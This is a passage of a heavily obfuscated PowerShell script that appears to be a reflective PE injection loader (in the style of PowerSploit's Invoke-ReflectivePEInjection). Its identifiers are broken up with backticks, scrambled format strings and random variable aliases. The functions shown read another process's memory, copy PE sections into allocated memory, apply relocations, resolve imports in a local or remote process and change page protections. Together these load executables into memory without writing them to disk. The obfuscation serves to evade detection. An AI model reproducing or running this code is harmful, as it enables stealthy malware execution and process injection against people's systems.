		[IntPtr]${REtURn`VaL`MEM} =  ${Gm`Qk}::("{2}{0}{1}"-f 'ocH','Global','All').Invoke(${P`TRSI`ze})
		${ReS`U`lT} = ${Win3`2FUNCTIO`Ns}."read`p`Ro`C`EssmemoRy"."InvO`ke"(${Re`Mo`TE`PrOcHa`ND`Le}, ${GE`T`PR`Ocad`drESsreTm`em}, ${rETur`N`V`A`lMem}, [UIntPtr][UInt64]${PtR`SI`Ze}, [Ref]${NUm`B`Yt`esWRit`TEN})
		if ((${Re`sUlt} -eq ${FA`lSe}) -or (${nu`MByTesW`R`ITtEn} -eq 0))
		{
			Throw ("{1}{3}{6}{8}{4}{0}{5}{2}{7}" -f'e','Call ','f','t','sM','mory ','o Read','ailed','Proces')
		}
		[IntPtr]${p`RO`CaDdrE`SS} =  ( gci ('Var'+'IA'+'b'+'Le:gMQk')).vAlUe::"PtRTo`StruC`T`U`Re"(${RE`TURN`VAlmem}, [Type][IntPtr])

        
		${Win32`F`UNCt`iO`NS}."vi`R`TUalfr`eEEx"."In`V`oke"(${R`E`mO`TEpr`ochAnDle}, ${RSca`d`Dr}, [UIntPtr][UInt64]0, ${WIN3`2`Const`A`NtS}."M`Em_R`ELeaSe") | &("{0}{2}{1}"-f 'Out-N','ll','u')
		${WIn32F`UNC`T`IoNS}."Vir`T`UaLfR`EeEX"."iN`Voke"(${re`Mo`TePr`OCH`ANDle}, ${g`etpR`ocaddREs`S`RETMeM}, [UIntPtr][UInt64]0, ${WI`N3`2COnSTanTs}."MEM_R`El`ease") | &("{1}{2}{0}"-f'l','Out-Nu','l')

        if (-not ${LOAdBy`OR`D`in`Al})
        {
            ${win32FUN`CT`i`ons}."ViRTual`F`REe`Ex"."inV`o`KE"(${r`E`moTEProChA`ND`lE}, ${rFUN`cN`AME`PtR}, [UIntPtr][UInt64]0, ${wiN32c`OnSt`An`TS}."me`M_rEle`ASE") | &("{2}{1}{0}"-f'ull','N','Out-')
        }

		return ${p`RO`CADDR`EsS}
	}


	Function C`OpY`-`sEctioNS
	{
		Param(
		[Parameter(pOsiTION = 0, ManDatOrY = ${Tr`Ue})]
		[Byte[]]
		${PEb`yT`es},

		[Parameter(POSiTION = 1, MaNdatorY = ${TR`UE})]
		[System.Object]
		${Pe`INFo},

		[Parameter(POSItiOn = 2, MandaTOry = ${t`RuE})]
		[System.Object]
		${wIn32`F`UNCti`o`NS},

		[Parameter(pOSITION = 3, mANdatoRY = ${Tr`Ue})]
		[System.Object]
		${WIn`32tY`PeS}
		)

		for( ${i} = 0; ${i} -lt ${PEI`NFO}."imaGE`_N`T`_`HeAde`Rs"."F`ILE`hEadeR"."NUmBer`ofSecTI`oNs"; ${I}++)
		{
			[IntPtr]${sE`c`TIOnHea`DErPtR} = [IntPtr](&("{0}{3}{1}{2}"-f'Add','edIntAsUns','igned','-Sign') ([Int64]${p`Ei`NfO}."SE`C`TiOnhEADE`RPTR") (${i} *  (vARiaBlE  gMQk  -VaLUEOnlY)::"siZE`oF"([Type]${W`IN32Ty`p`Es}."im`AgE_`sec`TION_`h`EaDer")))
			${s`E`CTionHea`Der} =  (gEt-vaRIaBlE  gMqK  -VALuEoNly )::"P`Trt`ost`RUC`TUre"(${SeCTIO`N`HEad`erPtR}, [Type]${w`iN32`Typ`ES}."I`m`AGe_s`EC`TI`oN_heaD`eR")

			
			[IntPtr]${Se`c`Ti`O`NDestAdDR} = [IntPtr](&("{3}{1}{0}{5}{6}{4}{2}"-f 'n','ig','gned','Add-S','ntAsUnsi','ed','I') ([Int64]${PEin`Fo}."P`eh`AnDlE") ([Int64]${se`ctioN`heA`d`er}."v`iRT`Ua`L`ADDRESS"))

			
			
			
			
			${SI`ZEofrAW`DAta} = ${SE`ctI`OnhE`AdER}."S`i`ze`oF`Rawdata"

			if (${seCtIO`NheaD`Er}."pO`iNT`e`RToRAWDA`Ta" -eq 0)
			{
				${s`Iz`eO`FRaWDatA} = 0
			}

			if (${SIzE`o`FRA`wd`AtA} -gt ${se`cTI`ONHEAD`er}."viRtU`A`lSI`zE")
			{
				${siZEO`F`Raw`data} = ${sE`ctIOn`h`EAdeR}."vi`RTua`l`SizE"
			}

			if (${SIzeOF`R`A`WdaTA} -gt 0)
			{
				&("{0}{4}{3}{5}{2}{1}"-f 'T','lid','a','ry','est-Memo','RangeV') -DebugString ("{5}{0}{3}{6}{4}{1}{2}{7}" -f 'cti','lCo','p','ons','a','Copy-Se','::Marsh','y') -PEInfo ${PEiN`Fo} -StartAddress ${sEctiONd`esTaD`dR} -Size ${SIz`E`ofR`AwDAtA} | &("{1}{0}" -f'-Null','Out')
				  ( GeT-variAbLe gmQk  -vAlueO  )::"C`Opy"(${p`eB`YtES}, [Int32]${SeCtI`ONH`eA`d`ER}."poI`N`TerTo`RAWd`ATa", ${se`ctI`OnDeSTA`ddR}, ${size`O`FR`AWD`ATA})
			}

			
			if (${seCTi`onH`E`A`Der}."SIZE`oFRa`wdA`TA" -lt ${sEct`IOn`H`eaD`Er}."vIrtu`Als`izE")
			{
				${dIf`F`E`RenCe} = ${Sec`Tion`HEA`D`er}."vI`Rtu`A`lSize" - ${s`IzeOFr`AW`d`AtA}
				[IntPtr]${STAR`TAddR`E`Ss} = [IntPtr](&("{5}{3}{1}{0}{2}{4}{6}" -f'nedIn','ig','tAsU','dd-S','nsig','A','ned') ([Int64]${sECTiON`d`EsTAd`DR}) ([Int64]${S`IZE`oFRawDATa}))
				&("{1}{6}{3}{2}{5}{0}{4}"-f 'Rang','T','em','M','eValid','ory','est-') -DebugString ("{2}{1}{3}{0}" -f't','py-Section','Co','s::Memse') -PEInfo ${p`eINFo} -StartAddress ${STARTa`DD`ResS} -Size ${D`IffErE`NCe} | &("{1}{0}{2}" -f 'ut-Nul','O','l')
				${Win3`2F`UNc`TIoNS}."m`emsET"."I`N`VOkE"(${S`TaRTAD`d`R`eSS}, 0, [IntPtr]${D`IFFe`RENCE}) | &("{2}{0}{1}" -f '-Nul','l','Out')
			}
		}
	}


	Function u`P`date-MeMO`Rya`DDr`Ess`es
	{
		Param(
		[Parameter(pOSITiON = 0, mANDatory = ${t`RUe})]
		[System.Object]
		${PeIn`Fo},

		[Parameter(PoSItION = 1, MaNdatORY = ${TR`Ue})]
		[Int64]
		${O`RiG`inAl`imAgEbase},

		[Parameter(poSItiOn = 2, ManDAToRY = ${T`RuE})]
		[System.Object]
		${w`iN32`C`O`NStaNtS},

		[Parameter(pOsItIoN = 3, MAnDaTOrY = ${T`RUE})]
		[System.Object]
		${W`iN32T`YpeS}
		)

		[Int64]${bA`S`Edi`FfE`RenCE} = 0
		${ADD`D`iF`Fe`RENCe} = ${TR`Ue} 
		[UInt32]${imAG`eBASER`E`Locs`IZe} =  (  DiR VariAbLE:GmQk ).vAlUE::"s`izEoF"([Type]${WI`N3`2types}."IMA`GE_BA`sE_ReloC`At`IoN")

		
		if ((${OriGin`Al`i`M`AgE`Base} -eq [Int64]${PeI`NfO}."ef`FectiVEp`E`HandLE") `
				-or (${p`eiNfo}."i`mage_N`T_HEAD`eRs"."Opt`i`On`AlheadeR"."bA`serEL`o`Cat`ioN`TAbLe"."si`ZE" -eq 0))
		{
			return
		}


		elseif ((&("{2}{0}{7}{6}{5}{3}{1}{4}"-f'ar','2AsU','Comp','hanVal','Int','rT','eate','e-Val1Gr') (${OrIgIN`A`lIm`AgEb`ASE}) (${pEin`Fo}."eFf`ecT`iV`ePEHA`NDle")) -eq ${Tr`Ue})
		{
			${Ba`seD`IFfE`RenCe} = &("{1}{4}{2}{7}{0}{5}{3}{6}"-f 'ignedIn','S','-','sUnsigne','ub','tA','d','S') (${OR`i`GiNALima`gEB`ASE}) (${pein`FO}."E`Ffe`ct`i`VEpeHaNDle")
			${a`dDdI`FfEr`enCE} = ${f`AlSe}
		}
		elseif ((&("{1}{4}{7}{2}{8}{3}{0}{6}{5}"-f'l2AsU','Compare-V','rT','anVa','al1Gre','nt','I','ate','h') (${p`EIn`FO}."E`FF`E`ctiv`epEHA`NDLE") (${O`RiginaLi`mageb`Ase})) -eq ${Tr`UE})
		{
			${B`ASedI`FFe`ReNce} = &("{1}{6}{2}{3}{4}{7}{5}{0}"-f'igned','Sub-','edInt','A','s','s','Sign','Un') (${pein`Fo}."EfFEcT`IvE`P`E`HAN`DlE") (${or`I`gi`Na`lIMagebase})
		}

		
		[IntPtr]${B`ASe`RE`LOCPTR} = [IntPtr](&("{3}{1}{5}{0}{2}{4}" -f 'ns','d','i','Ad','gned','-SignedIntAsU') ([Int64]${Pe`i`NFO}."Pe`h`AnDLE") ([Int64]${p`eI`NFO}."iMAge_`Nt`_hEaD`eRs"."o`P`TioNa`lHEa`DEr"."baseR`eL`O`CAt`IonTA`BLe"."vIRT`UAl`A`dDr`eSs"))
		while(${Tr`Ue})
		{
			
			${BA`serelOCAtiO`NTa`B`LE} =  ${g`MQk}::"pTrT`osT`RU`CtUre"(${BAsE`R`EL`ocptr}, [Type]${Wi`N3`2tYpes}."i`Mage_`BAsE_R`ELoCaTIOn")

			if (${Ba`S`eRElOca`TionTaB`le}."sIz`EOFb`LOCk" -eq 0)
			{
				break
			}

			[IntPtr]${M`Ema`dDRb`AsE} = [IntPtr](&("{5}{4}{2}{1}{0}{6}{3}" -f'n','nedIntAsUnsig','ig','d','S','Add-','e') ([Int64]${P`Ein`Fo}."p`ehaN`DLE") ([Int64]${baS`Er`ELoc`ATIOntA`BLe}."viRtU`Al`ADd`RESs"))
			${nuM`R`EloCat`ioNS} = (${baserEl`OcAti`O`NT`A`Ble}."siZEOF`BLo`Ck" - ${I`mAG`eb`AsE`R`elO`csize}) / 2

			
			for(${I} = 0; ${i} -lt ${nU`mRelo`Cati`onS}; ${I}++)
			{
				
				${r`e`lOCATIoNi`NF`OPTR} = [IntPtr](&("{3}{1}{2}{0}{4}" -f 'IntAsUnsigne','Si','gned','Add-','d') ([IntPtr]${B`Ase`RelocP`Tr}) ([Int64]${IMAge`Ba`SE`REL`Oc`sizE} + (2 * ${I})))
				[UInt16]${R`e`loCATIon`i`NFO} =  (  GeT-VaRiAbLE  ("gmQ"+"K") -vaLUeO  )::"pTRtosT`R`UC`T`Ure"(${rElocA`T`IoN`InfOp`Tr}, [Type][UInt16])

				
				[UInt16]${ReLocof`F`S`et} = ${R`ElOCat`iOni`NFo} -band 0x0FFF
				[UInt16]${re`loCt`YpE} = ${rEl`oCa`TI`o`NinfO} -band 0xF000
				for (${j} = 0; ${J} -lt 12; ${J}++)
				{
					${r`eloC`TYPe} =   (gET-VARiAblE  E1f2M).vAlUe::("{0}{1}"-f 'Flo','or').Invoke(${ReLoc`Ty`pE} / 2)
				}

				
				
				
				if ((${R`e`L`OCtYPe} -eq ${wIn`3`2c`OnstANTS}."I`mage_REL_basEd`_`HiG`HLoW") `
						-or (${re`lo`CtyPE} -eq ${wIn`3`2c`onSTaNtS}."iMAGe`_R`el_BAs`E`D_Di`R64"))
				{
					
					[IntPtr]${F`i`NaLaDdR} = [IntPtr](&("{3}{1}{4}{5}{2}{0}"-f 'gned','ig','sUnsi','Add-S','nedInt','A') ([Int64]${mEmad`dRB`A`Se}) ([Int64]${rEL`oCoff`Set}))
					[IntPtr]${CU`Rra`Ddr} =   ( iTEm VaRiable:gmqk).VALue::"pT`R`Tostr`UcTu`RE"(${F`I`Na`laDDr}, [Type][IntPtr])

					if (${AdDDIf`F`ERen`CE} -eq ${TR`Ue})
					{
						[IntPtr]${c`U`RRad`dr} = [IntPtr](&("{2}{1}{3}{4}{0}" -f'igned','d-SignedInt','Ad','A','sUns') ([Int64]${CUR`R`ADDR}) (${BA`S`EdifF`ERe`NCe}))
					}
					else
					{
						[IntPtr]${cu`Rr`ADdR} = [IntPtr](&("{2}{5}{1}{3}{6}{4}{0}{7}"-f'ns','e','Sub-S','dI','AsU','ign','nt','igned') ([Int64]${Cu`Rr`Addr}) (${bAsEDifFe`Ren`Ce}))
					}

					  ( GEt-ITEm  VaRIAbLE:gmqK  ).vaLUe::("{0}{3}{2}{1}"-f 'St','r','uctureToPt','r').Invoke(${CUR`R`AdDr}, ${FINAL`A`ddR}, ${FA`LsE}) | &("{0}{1}"-f'Out-N','ull')
				}
				elseif (${R`eLOctY`pE} -ne ${WIn3`2`CO`NsTAntS}."I`ma`GE_`REL_ba`S`ed_a`BsolU`Te")
				{
					
					Throw ('Unk'+'now'+'n '+'relo'+'cati'+'on '+'found'+', '+'r'+'el'+'ocation '+'valu'+'e: '+"$RelocType, "+'r'+'el'+'ocationinfo'+': '+"$RelocationInfo")
				}
			}

			${b`A`sE`ReLoCptR} = [IntPtr](&("{1}{0}{2}{4}{3}"-f'd-S','Ad','i','AsUnsigned','gnedInt') ([Int64]${B`ASe`REl`OcPtR}) ([Int64]${B`ASerELoc`Ati`oNTa`B`lE}."SIz`EO`FbL`ock"))
		}
	}


	Function ImPO`RT`-DlliMPoR`TS
	{
		Param(
		[Parameter(positION = 0, MANDAtORy = ${tr`Ue})]
		[System.Object]
		${PE`iN`Fo},

		[Parameter(pOSItioN = 1, MaNDAtoRy = ${t`RUE})]
		[System.Object]
		${w`iN32Fun`ctIO`NS},

		[Parameter(pOSitIoN = 2, maNdatoRy = ${TR`UE})]
		[System.Object]
		${wIn32`Ty`pEs},

		[Parameter(pOSiTION = 3, mAnDAtory = ${t`RUE})]
		[System.Object]
		${WIN3`2CO`NsTa`NTS},

		[Parameter(POsITIoN = 4, MAnDatOrY = ${f`AL`SE})]
		[IntPtr]
		${REmot`Epr`OCHa`N`Dle}
		)

		${RE`MO`TELOa`DIng} = ${fa`lSe}
		if (${p`e`INFO}."PehA`Ndle" -ne ${PEIn`FO}."eF`FE`CTive`p`e`hAnDlE")
		{
			${reMo`T`EL`OadI`Ng} = ${tR`UE}
		}

		if (${peIn`FO}."iMaG`e_`N`T_`heA`deRS"."oP`Tio`NA`lhEad`er"."I`MpoRTT`Able"."SI`ze" -gt 0)
		{
			[IntPtr]${I`m`po`RTDesCRiPtoRptr} = &("{3}{2}{0}{5}{1}{4}"-f'gnedI','sign','Si','Add-','ed','ntAsUn') ([Int64]${PEiN`FO}."pE`HAnDle") ([Int64]${Pe`in`FO}."Im`AG`E_nt`_H`EAders"."oPtIo`NAlhE`Ader"."IM`Por`T`TABLE"."v`I`Rt`UaL`AdDREsS")

			while (${T`RUE})
			{
				${Im`pO`RtDEscrIP`TOr} =  (GeT-CHiLdITem vAriabLE:gmqK ).VALue::"Pt`RTo`st`RuCtuRE"(${iMP`orTdes`c`RiPtorPtr}, [Type]${w`in`32`TyPes}."imAgE_`IMP`orT_d`EsC`RIPTOr")

				
				if (${iMP`ORtdesCr`IP`T`oR}."cHar`AC`T`erIStICS" -eq 0 `
						-and ${imPoRTd`Es`cRi`Pt`OR}."FIrS`T`ThunK" -eq 0 `
						-and ${Im`PortD`e`SCRIp`TOr}."fO`RWarde`Rc`ha`IN" -eq 0 `
						-and ${i`mPoR`TdESCrI`PtOr}."NA`mE" -eq 0 `
						-and ${i`M`POrTDescrI`pTor}."T`imedAT`e`sTAmp" -eq 0)
				{
					&("{1}{4}{2}{3}{0}"-f'se','Wri','Verb','o','te-') ("{5}{3}{1}{2}{0}{4}" -f' ','o','rting','ne imp','DLL imports','Do')
					break
				}

				${imPo`R`Td`lLH`AnDLe} =   (vARiAblE  u8M1sf  -vAlUEonlY)::"Z`Ero"
				${I`M`Po`RTDLlpaThPtR} = (&("{5}{0}{1}{4}{2}{3}" -f 'd-SignedIntA','sU','signe','d','n','Ad') ([Int64]${p`EI`NFo}."peHAND`le") ([Int64]${iMPOr`TD`Esc`RIpt`OR}."n`AMe"))
				${i`MPoRtdL`l`PAtH} =   ${G`mqK}::("{0}{3}{2}{1}{4}" -f 'Ptr','s','An','ToString','i').Invoke(${iMPoRtD`L`L`p`AThPtr})

				if (${reMotElO`A`DiNg} -eq ${TR`UE})
				{
					${IMpORTdL`l`haN`dlE} = &("{0}{3}{6}{4}{2}{1}{5}" -f 'Impor','es','oc','t-Dl','RemotePr','s','lIn') -RemoteProcHandle ${RE`mo`TEpRoC`Han`D`Le} -ImportDllPathPtr ${iMp`oRTdlLp`ATh`PTR}
				}
				else
				{
					${i`Mp`o`RTdllhan`DLe} = ${w`iN`3`2fUN`cTIONs}."loaD`li`BrAry"."In`VoKE"(${i`MportDl`L`pa`Th})
				}

				if ((${iMP`Or`T`dLLHaNDlE} -eq ${nu`LL}) -or (${imPor`TdllH`A`NDLe} -eq  ( vARIaBLe  u8m1SF  -vAlUEONlY)::"ZE`Ro"))
				{
					throw ('Error'+' '+'imp'+'orti'+'ng '+'D'+'LL, '+'DLLNa'+'me'+': '+"$ImportDllPath")
				}

				
				[IntPtr]${T`hUNk`REf} = &("{1}{4}{3}{0}{2}"-f 's','Add-Sig','Unsigned','tA','nedIn') (${Pe`i`NfO}."P`Eh`AndlE") (${iMPORT`DESC`RI`PtOr}."f`iRsTthU`NK")
				[IntPtr]${OrI`g`iNAlthu`Nkref} = &("{1}{3}{4}{0}{2}" -f'g','Add-S','ned','ignedI','ntAsUnsi') (${PeI`NFo}."pe`HAn`dle") (${ImpO`RTdE`S`c`R`IPToR}."c`haRACTeRISti`cs") 
				[IntPtr]${OR`ig`iNa`lT`hUnkr`efvAL} =   ${G`MQk}::"p`T`RtOStRuC`TURE"(${OrIGinA`LT`h`UNK`Ref}, [Type][IntPtr])

				while (${O`RiGInal`ThU`NK`R`eFv`Al} -ne  (geT-chIldITEm  varIaBLe:U8M1sf  ).Value::"Ze`RO")
				{
                    ${LOA`d`BYo`RdInAl} = ${Fa`L`sE}
                    [IntPtr]${ProCedurE`N`A`MEptr} =   ${u`8M1Sf}::"ze`Ro"
					
					
					
					[IntPtr]${n`ew`ThUNKr`Ef} =  (GET-variaBlE U8m1sF -VaLuEO)::"z`ErO"
					if( (  geT-iteM  varIAblE:GmQK  ).VaLuE::"Si`ZeoF"([Type][IntPtr]) -eq 4 -and [Int32]${orIgInALt`HUn`k`REFV`Al} -lt 0)
					{
						[IntPtr]${P`Ro`Ced`URENameptr} = [IntPtr]${O`RigIN`AlThu`Nk`Re`Fval} -band 0xffff 
                        ${loadb`yorDi`NAl} = ${TR`UE}
					}
                    elseif( (  LS  VAriAbLE:GmQk).valUE::"S`IZEOF"([Type][IntPtr]) -eq 8 -and [Int64]${ORig`inaltHun`KrEf`VaL} -lt 0)
					{
						[IntPtr]${prOcEd`U`Ren`Am`Ep`Tr} = [Int64]${ORiG`inA`Lth`UNKrEf`VaL} -band 0xffff 
                        ${lOad`B`Y`ORd`INal} = ${tR`Ue}
					}
					else
					{
						[IntPtr]${s`TR`IN`GaDdr} = &("{0}{4}{5}{3}{2}{1}"-f'Ad','tAsUnsigned','dIn','igne','d','-S') (${PEi`NFo}."pe`hANd`LE") (${orIgi`Nal`ThUn`krefvaL})
						${ST`R`in`GaDDR} = &("{4}{5}{0}{2}{1}{3}" -f'-','Un','SignedIntAs','signed','A','dd') ${sT`R`I`NgaDdr} ( (GEt-vArIABle  ('g'+'MQk')  ).Value::"s`ize`oF"([Type][UInt16]))
						${prOce`Dur`e`NamE} =  (  Get-vaRIable GMQk  ).VaLuE::("{3}{0}{4}{2}{1}" -f'tr','ngAnsi','ri','P','ToSt').Invoke(${sTRiNGA`D`DR})
                        ${pRoCe`DuRE`NAMep`TR} =  (  GEt-vaRiaBLE Gmqk  -VaLUe )::("{1}{3}{0}{2}" -f 'oHGlobalAns','String','i','T').Invoke(${PR`oCE`D`UR`eNAMe})
					}

					if (${r`eMO`TE`loADIng} -eq ${Tr`UE})
					{
						[IntPtr]${N`ewThUn`kr`ef} = &("{5}{1}{2}{0}{4}{3}" -f'r','et-','RemoteP','ss','ocAddre','G') -RemoteProcHandle ${R`EmOtEP`ROcha`N`DLE} -RemoteDllHandle ${Im`Por`TDllhAN`DLE} -FunctionNamePtr ${pRO`c`Ed`UrEnA`mepTr} -LoadByOrdinal ${L`oA`DByO`RDIN`Al}
					}
					else
					{
				        [IntPtr]${NeW`TH`U`NkreF} = ${w`IN`32func`Tio`Ns}."gET`pR`OcAdD`R`esSi`N`TptR"."In`VokE"(${iMp`Or`TdLLHA`Nd`Le}, ${prOce`dUrE`Name`PTr})
					}

					if (${new`ThuNK`R`ef} -eq ${N`Ull} -or ${nEw`THUN`kr`Ef} -eq  (  GeT-VaRIABLe  U8M1sf  -valUeON)::"Z`ERo")
					{
                        if (${LoadB`YoRd`in`Al})
                        {
                            Throw ('Ne'+'w '+'fun'+'cti'+'o'+'n '+'re'+'f'+'erence '+'i'+'s '+'n'+'ul'+'l, '+'thi'+'s '+'is'+' '+'alm'+'os'+'t '+'c'+'ert'+'ainly'+' '+'a '+'b'+'ug '+'in'+' '+'this'+' '+'s'+'cript.'+' '+'Fun'+'ctio'+'n'+' '+'Or'+'di'+'nal: '+"$ProcedureNamePtr. "+'D'+'ll: '+"$ImportDllPath")
                        }
                        else
                        {
						    Throw ('N'+'ew '+'f'+'unction'+' '+'refer'+'e'+'nce '+'is'+' '+'nu'+'ll, '+'t'+'his '+'i'+'s '+'a'+'l'+'most '+'c'+'ertainl'+'y '+'a '+'b'+'ug '+'in'+' '+'th'+'is '+'scri'+'pt.'+' '+'F'+'unct'+'ion: '+"$ProcedureName. "+'Dll'+': '+"$ImportDllPath")
                        }
					}

					  ${g`MQK}::("{0}{2}{1}{3}" -f 'Struc','reToP','tu','tr').Invoke(${n`ew`THu`NKrEF}, ${t`HUnk`REf}, ${fA`lSe})

					${t`H`UNKrEf} = &("{1}{6}{0}{5}{2}{4}{3}" -f 'd','A','i','Unsigned','gnedIntAs','-S','d') ([Int64]${tHu`N`KrEF}) ( ${G`mQk}::"s`Iz`eOF"([Type][IntPtr]))
					[IntPtr]${OriGiNaL`THU`N`kReF} = &("{1}{2}{3}{0}{4}"-f 'sig','Add','-Signe','dIntAsUn','ned') ([Int64]${O`RIgin`ALt`hU`NKrEf}) (  ${G`mQK}::"siZE`oF"([Type][IntPtr]))
					[IntPtr]${OR`ig`IN`ALtHuNKrefval} =   (vAriAbLE  ('GM'+'QK')  -vAl)::"PTRt`oS`TrU`CT`Ure"(${O`R`IGin`AlThU`NKREf}, [Type][IntPtr])

                    
                    
                    if ((-not ${LoA`dby`ordiN`AL}) -and (${pROce`dU`R`EN`AmE`pTr} -ne   ${u`8`m1Sf}::"Z`ero"))
                    {
                         ${G`MQK}::("{2}{1}{0}" -f'bal','o','FreeHGl').Invoke(${pR`oC`eDurENA`Me`ptR})
                        ${pROc`eDurEnaM`Ep`TR} =  (vARiABLe ("u"+"8M1sf") -vAlUeo )::"ze`Ro"
                    }
				}

				${Im`pOrTD`eSC`RIpTO`R`p`Tr} = &("{1}{3}{5}{4}{2}{0}"-f 'd','Add','ne','-SignedIntAsUns','g','i') (${IMpOrT`de`Sc`RIPtOr`pTr}) (  (  gI  VAriaBle:GMQk  ).VaLuE::"s`iZ`Eof"([Type]${wiN32t`Yp`Es}."I`m`A`gE`_ImPO`Rt_DeS`CRIPtOr"))
			}
		}
	}

	Function gEt`-VIrtuaLPrOTE`C`T`V`A`Lue
	{
		Param(
		[Parameter(PosiTioN = 0, mANDAtory = ${tR`UE})]
		[UInt32]
		${SeC`TioN`ch`ARacT`eri`STiCs}
		)

		${P`R`OTectiO`Nf`laG} = 0x0
		if ((${SECT`i`ON`ChA`Ract`Eri`sTicS} -band ${WI`N32c`ons`TANTs}."iMag`e_`sC`N_MEM_exECu`Te") -gt 0)
		{
			if ((${sectI`on`cHa`R`A`CTe`RisTIcs} -band ${W`i`N32CoNs`TaN`Ts}."I`m`AGE_s`cn_mE`m_re`AD") -gt 0)
			{
				if ((${s`e`CtiOn`c`HAraCtER`I`stics} -band ${Wi`N3`2Con`StANTs}."IM`AGE_`sCN_M`eM_`w`Rite") -gt 0)
				{
					${pRotE`ctiO`N`F`Lag} = ${w`in32`Con`sTa`Nts}."p`AG`E_EXecuTE_`ReADw`RI`Te"
				}
				else
				{
					${PrO`TEcTi`o`N`Flag} = ${W`i`N`32con`stAnTs}."Pa`ge_ExECut`e`_`REaD"
				}
			}
			else
			{
				if ((${sEcT`iOn`C`hara`cterISt`icS} -band ${W`iN3`2coNstAN`TS}."IMaGe_sc`N_m`E`M_Wr`ItE") -gt 0)
				{
					${PRO`TeCTI`O`NflAG} = ${win32`cO`Nst`ANtS}."PAG`e_eXec`UTE_w`RiT`eCoPY"
				}
				else
				{
					${PRO`TectIonF`LAg} = ${wiN`32CO`NSTAn`TS}."p`A`ge_eXEc`Ute"
				}
			}
		}
		else
		{
			if ((${seCt`IonCH`A`RACTerI`STiCs} -band ${WiN32C`O`NSTan`Ts}."I`M`AgE_sCn_MeM`_rEAD") -gt 0)
			{
				if ((${sE`ctIOnc`HAR`ACTerIST`iCs} -band ${wi`N`32cO`Ns`TAnts}."iMAGe_scn`_me`m`_wRi`TE") -gt 0)
				{
					${PRotEC`TiONFL`Ag} = ${Win32`CONSt`A`NtS}."paGE_`R`EAD`wr`iTE"
				}
				else
				{
					${PR`oT`E`CTIon`FLAG} = ${W`In`32C`oN`sTANTS}."PA`gE_ReA`dOn`lY"
				}
			}
			else
			{
				if ((${secTIoNcha`R`AC`TeriSt`ICs} -band ${wiN3`2c`On`St`ANtS}."IM`Ag`e_ScN_M`em_wRiTE") -gt 0)
				{
					${PRO`TEcT`IO`N`FlAg} = ${Wi`N`32CON`StAn`Ts}."pa`ge_`Writ`eCoPY"
				}
				else
				{
					${pROT`e`c`TioN`FLAg} = ${WIN32CO`NSTA`N`TS}."PaG`E_`N`OacCeSS"
				}
			}
		}

		if ((${Se`c`TI`onCH`ARaCteRIs`TiCS} -band ${Wi`N32C`oN`stANTS}."I`MAg`e_sCN_M`Em_N`OT`_CaChED") -gt 0)
		{
			${PRoT`E`CTi`ONflaG} = ${p`ROTECtI`Onf`L`Ag} -bor ${win3`2c`OnSt`ANtS}."PaG`e`_N`oCaCHE"
		}

		return ${pro`T`EcTIoNf`L`AG}
	}

	Function Up`da`TE-`Memo`RypR`o`T`ectIOnfLa`gs
	{
		Param(
		[Parameter(POsitiON = 0, maNdATORY = ${t`RUe})]
		[System.Object]
		${p`ein`FO},

		[Parameter(posiTiOn = 1, manDATory = ${Tr`UE})]
		[System.Object]
		${wiN32f`UnC`TI`OnS},

		[Parameter(POsItIOn = 2, ManDatORy = ${tr`Ue})]
		[System.Object]
		${wi`N32COnST`ANTs},

		[Parameter(PoSItIon = 3, MANdatoRY = ${TR`Ue})]
		[System.Object]
		${Wi`N32t`yP`Es}
		)

		for( ${I} = 0; ${I} -lt ${P`ei`NfO}."i`mAge_NT_HeAd`E`RS"."fiLeh`e`ADeR"."nu`mBe`ROF`SEctI`ons"; ${I}++)
		{
			[IntPtr]${SECtI`O`Nhe`AderP`Tr} = [IntPtr](&("{0}{4}{7}{2}{5}{6}{3}{1}" -f 'A','d','d','e','dd','IntAsUnsig','n','-Signe') ([Int64]${p`EinFo}."SEcti`On`HE`Ader`Ptr") (${I} *   ${GM`qk}::"SIzE`OF"([Type]${w`IN`32t`ypeS}."im`Age_S`eCTi`O`N_HEaDER")))
			${seC`TIonheAD`eR} =   (  dir  ("VARiAb"+"LE:"+"G"+"MQK") ).vAlUe::"ptr`TO`Str`U`cTuRe"(${secT`io`N`hEAdEr`PTR}, [Type]${w`IN3`2TYp`eS}."i`mage`_sEc`T`iON_h`ea`dER")
			[IntPtr]${SE`Ct`ioNpTr} = &("{2}{3}{0}{1}{4}{5}"-f '-Sig','nedI','Ad','d','ntAsUnsi','gned') (${pe`INFO}."Pehan`dLE") (${sE`c`TiOnHeA`Der}."viRtU`A`Lad`DrEsS")

			[UInt32]${ProtEcTf`L`Ag} = &("{0}{2}{4}{1}{3}" -f'G','VirtualPro','e','tectValue','t-') ${SeCti`ONh`eA`d`ER}."c`HA`RaC`TeRI`STICs"
			[UInt32]${SeCTI`o`NSIzE} = ${s`EctIoNh`EaDEr}."vI`Rtua`lSI`Ze"

			[UInt32]${olD`p`ROtECtFlag} = 0
			&("{3}{4}{0}{2}{1}" -f '-Memory','id','RangeVal','T','est') -DebugString ("{8}{1}{4}{6}{9}{0}{3}{5}{7}{2}" -f'nFl','ate-MemoryP','otect','ags::V','r','irtual','otecti','Pr','Upd','o') -PEInfo ${P`EI`NFO} -StartAddress ${SE`C`TioNp`TR} -Size ${s`eCtI`o`NsIze} | &("{0}{1}"-f'Out-Nu','ll')
			${SUCcE`ss} = ${WiN32`F`U`NctIo`NS}."v`iR`TUaLprot`EcT"."Inv`oKe"(${SEcTI`o`N`PTr}, ${SEcTi`on`s`Ize}, ${p`RO`Tectfl`Ag}, [Ref]${OL`d`pr`OtECt`FlAG})
			if (${S`UCCe`SS} -eq ${f`A`LSe})
			{
				Throw ("{3}{6}{7}{0}{2}{8}{1}{5}{4}"-f 'cha','y pr','nge m','U','tion','otec','nab','le to ','emor')
			}
		}
	}

	
	
	Function u`PdAte-ExEFu`Nc`T`I`ons
	{
		Param(
		[Parameter(pOsiTIOn = 0, mANDATOrY = ${t`RuE})]
		[System.Object]
		${PEi`Nfo},

		[Parameter(POsitIOn = 1, MaNDATorY = ${t`RuE})]
		[System.Object]
		${win32`FunCT`I`oNS},

		[Parameter(PoSiTiOn = 2, mandaTORY = ${T`RUE})]
		[System.Object]
		${wI`N32`cONstA`Nts},

		[Parameter(pOsiTIOn = 3, MaNdAtorY = ${Tr`UE})]
		[String]
		${e`xear`guMeNts},

		[Parameter(POsiTion = 4, MaNdAtORy = ${tr`Ue})]
		[IntPtr]
		${ExeDONe`By`T`e`pTR}
		)

		
		${reTuRnar`R`Ay} = @()

